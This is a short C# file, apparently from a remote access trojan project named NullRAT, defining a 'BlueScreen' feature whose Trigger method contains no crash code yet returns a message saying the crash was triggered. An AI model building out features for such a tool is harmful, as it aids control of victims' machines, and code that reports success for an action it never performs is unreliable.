namespace NullRAT.Features
{
    public static class BlueScreen
    {
        public static string Trigger()
        {
            try // this requires admin
            {
                return "BSOD triggered (requires high privileges)";
            }
            catch
            {
                return "Failed to trigger BSOD.";
            }
        }
    }
}